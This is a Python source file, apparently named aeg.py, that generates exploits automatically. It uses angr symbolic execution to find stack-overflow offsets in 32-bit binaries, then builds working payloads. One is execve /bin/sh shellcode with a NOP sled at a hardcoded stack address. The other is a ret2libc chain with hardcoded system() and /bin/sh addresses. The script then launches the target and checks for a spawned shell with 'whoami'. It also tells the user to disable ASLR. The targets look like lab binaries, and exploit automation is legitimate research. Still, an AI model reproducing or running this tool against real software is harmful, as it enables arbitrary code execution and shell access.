import angr
import claripy
import struct
import os
import sys
import subprocess

from pwn import process, context


# ─────────────────────────────────────────────
# Option 2 — ASLR Detection
# ─────────────────────────────────────────────

def check_aslr():
    try:
        with open('/proc/sys/kernel/randomize_va_space', 'r') as f:
            val = int(f.read().strip())
        if val != 0:
            print(f"[!] WARNING: ASLR is enabled (value={val})")
            print(f"[!] Disable it first: echo 0 > /proc/sys/kernel/randomize_va_space")
            print(f"[!] Hardcoded addresses will not work with ASLR on.")
            sys.exit(1)
        else:
            print(f"[+] ASLR disabled — OK")
    except Exception as e:
        print(f"[!] Could not check ASLR: {e}")


# ─────────────────────────────────────────────
# Option 1 — Auto Symbol Scanner
# ─────────────────────────────────────────────

DANGEROUS_FUNCTIONS = ['gets', 'strcpy', 'strcat', 'scanf', 'sprintf']

def find_vulnerable_function(proj):
    """
    First try to find a function literally named 'vulnerable'.
    If not found, scan the CFG for calls to dangerous functions
    and return the parent function's address.
    """
    # Primary: look for 'vulnerable' symbol
    for sym, addr in proj.loader.main_object.symbols_by_name.items():
        if 'vulnerable' in sym:
            print(f"[+] Found vulnerable() at: {hex(addr.rebased_addr)}")
            return addr.rebased_addr, 'symbol'

    # Fallback: CFG scan for dangerous function calls
    print(f"[~] No vulnerable() symbol — scanning CFG for dangerous calls...")
    cfg = proj.analyses.CFGFast()

    for func_addr, func in cfg.kb.functions.items():
        for callsite in func.get_call_sites():
            target = func.get_call_target(callsite)
            if target is None:
                continue
            target_func = cfg.kb.functions.get(target)
            if target_func and target_func.name in DANGEROUS_FUNCTIONS:
                print(f"[+] Found call to {target_func.name}() inside {func.name} at {hex(func_addr)}")
                return func_addr, target_func.name

    print("[-] No vulnerable function found")
    return None, None


# ─────────────────────────────────────────────
# NX Detection
# ─────────────────────────────────────────────

def is_nx_enabled(binary_path):
    try:
        out = subprocess.check_output(
            ['readelf', '-l', binary_path],
            stderr=subprocess.DEVNULL
        ).decode()
        for line in out.splitlines():
            if 'GNU_STACK' in line:
                if 'RWE' in line or 'E' in line.split()[-1]:
                    return False
        return True
    except Exception:
        return False


# ─────────────────────────────────────────────
# Offset Finding (symbolic execution)
# ─────────────────────────────────────────────

def find_offset(binary_path):
    print(f"[*] Loading binary: {binary_path}")
    proj = angr.Project(binary_path, auto_load_libs=False)

    vuln_addr, method = find_vulnerable_function(proj)

    if vuln_addr is None:
        print("[-] Could not find any vulnerable function")
        return None

    payload = claripy.BVS('payload', 200 * 8)

    state = proj.factory.call_state(
        vuln_addr,
        stdin=angr.SimFile(name='stdin', content=payload)
    )

    state.options.add(angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS)
    state.options.add(angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY)

    simgr = proj.factory.simulation_manager(
        state,
        save_unconstrained=True
    )

    print(f"[*] Running symbolic execution...")
    simgr.run()

    if not simgr.unconstrained:
        print("[-] No unconstrained states found")
        return None

    for crashed_state in simgr.unconstrained:
        eip = crashed_state.regs.eip
        if crashed_state.solver.symbolic(eip):
            print(f"[+] EIP is symbolic - we control it!")

            crashed_state.solver.add(eip == 0x41414141)
            concrete_payload = crashed_state.solver.eval(payload, cast_to=bytes)

            print(f"[+] Concrete payload (hex): {concrete_payload.hex()}")

            target = b'\x41\x41\x41\x41'
            offset = concrete_payload.find(target)

            if offset != -1:
                print(f"[+] Offset found: {offset} bytes")
                return offset

            for j in range(len(concrete_payload) - 3):
                if concrete_payload[j:j+4] == target:
                    print(f"[+] Offset found: {j} bytes")
                    return j

            print("[-] Could not find offset in payload")
            return None

    return None


# ─────────────────────────────────────────────
# Shellcode Payload (NX disabled)
# ─────────────────────────────────────────────

def build_shellcode_payload(binary_path, offset):
    print(f"[*] Building shellcode payload (NX disabled)...")

    shellcode = bytes([
        0x31, 0xc0,
        0x50,
        0x68, 0x2f, 0x2f, 0x73, 0x68,
        0x68, 0x2f, 0x62, 0x69, 0x6e,
        0x89, 0xe3,
        0x89, 0xc1,
        0x89, 0xc2,
        0xb0, 0x0b,
        0xcd, 0x80
    ])

    NOP  = b'\x90' * 200
    addr = 0xffffd640

    ret           = struct.pack('<I', addr)
    final_payload = b'A' * offset + ret + NOP + shellcode

    output = f"payload_{os.path.basename(binary_path)}"
    with open(output, 'wb') as f:
        f.write(final_payload)

    print(f"[+] Stack address : {hex(addr)}")
    print(f"[+] Payload saved : {output}")

    return addr, output, len(shellcode), len(NOP)


# ─────────────────────────────────────────────
# ret2libc Payload (NX enabled)
# ─────────────────────────────────────────────

def build_ret2libc_payload(binary_path, offset):
    print(f"[*] Building ret2libc payload (NX enabled)...")

    # Confirmed addresses from /usr/lib32/libc-2.31.so (ASLR disabled)
    # libc base: 0xf7dca000
    # system() offset: 0x41360  → 0xf7e0b360
    # /bin/sh offset:  0x18c363 → 0xf7f56363
    system_addr = 0xf7e0b360
    binsh_addr  = 0xf7f56363

    final_payload = (
        b'A' * offset +
        struct.pack('<I', system_addr) +
        b'BBBB' +
        struct.pack('<I', binsh_addr)
    )

    output = f"payload_{os.path.basename(binary_path)}"
    with open(output, 'wb') as f:
        f.write(final_payload)

    print(f"[+] libc base  : 0xf7dca000")
    print(f"[+] system()   : {hex(system_addr)}")
    print(f"[+] /bin/sh    : {hex(binsh_addr)}")
    print(f"[+] Payload saved: {output}")

    return system_addr, binsh_addr, output, len(final_payload)


# ─────────────────────────────────────────────
# Option 3 — Exploit Verification
# ─────────────────────────────────────────────

def verify_exploit(binary_path, payload_path, args=None):
    print(f"[*] Verifying exploit...")
    try:
        context.log_level = 'error'  # suppress pwntools noise

        cmd = [binary_path]
        if args:
            cmd.append(args)

        with open(payload_path, 'rb') as f:
            payload_bytes = f.read()

        p = process(cmd)
        p.send(payload_bytes + b'\n')
        import time; time.sleep(0.5)   # wait for shell to spawn
        p.sendline(b'whoami')

        try:
            output = p.recvline(timeout=3).strip().decode(errors='ignore')
            if output:
                print(f"[+] VERIFIED — shell spawned as: {output}")
                return True
            else:
                print(f"[-] No response — exploit may have failed")
                return False
        except Exception:
            print(f"[-] Timeout — exploit likely failed")
            return False
        finally:
            p.close()

    except Exception as e:
        print(f"[-] Verification error: {e}")
        return False


# ─────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────

def generate_payload(binary_path, args=None):
    # Step 0 — check ASLR
    check_aslr()

    # Step 1 — find offset via symbolic execution
    offset = find_offset(binary_path)
    if offset is None:
        print("[-] Could not find offset")
        return

    # Step 2 — detect NX and choose payload type
    nx = is_nx_enabled(binary_path)
    print(f"[*] NX enabled: {nx}")

    if not nx:
        found_addr, output, shellcode_len, nop_len = build_shellcode_payload(
            binary_path, offset
        )
        print(f"\n[+] ===== SUCCESS (shellcode) =====")
        print(f"[+] Binary:        {binary_path}")
        print(f"[+] Offset:        {offset} bytes")
        print(f"[+] Return addr:   {hex(found_addr)}")
        print(f"[+] NOP sled:      {nop_len} bytes")
        print(f"[+] Shellcode:     {shellcode_len} bytes")
        print(f"[+] Total payload: {offset + 4 + nop_len + shellcode_len} bytes")
        print(f"[+] Payload saved: {output}")
    else:
        system_addr, binsh_addr, output, total = build_ret2libc_payload(
            binary_path, offset
        )
        print(f"\n[+] ===== SUCCESS (ret2libc) =====")
        print(f"[+] Binary:        {binary_path}")
        print(f"[+] Offset:        {offset} bytes")
        print(f"[+] system():      {hex(system_addr)}")
        print(f"[+] /bin/sh:       {hex(binsh_addr)}")
        print(f"[+] Total payload: {total} bytes")
        print(f"[+] Payload saved: {output}")

    # Step 3 — verify exploit automatically
    print()
    verify_exploit(binary_path, output, args)

    print(f"")
    if args:
        print(f"[+] Run manually: (cat {output}; cat) | {binary_path} {args}")
    else:
        print(f"[+] Run manually: (cat {output}; cat) | {binary_path}")


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python aeg.py <binary> [args]")
        print("")
        print("Examples:")
        print("  python aeg.py ./target          # NX off -> shellcode")
        print("  python aeg.py ./target2 hello   # NX off -> shellcode")
        print("  python aeg.py ./target7          # NX on  -> ret2libc")
        sys.exit(1)

    binary = sys.argv[1]
    args   = sys.argv[2] if len(sys.argv) > 2 else None

    generate_payload(binary, args)
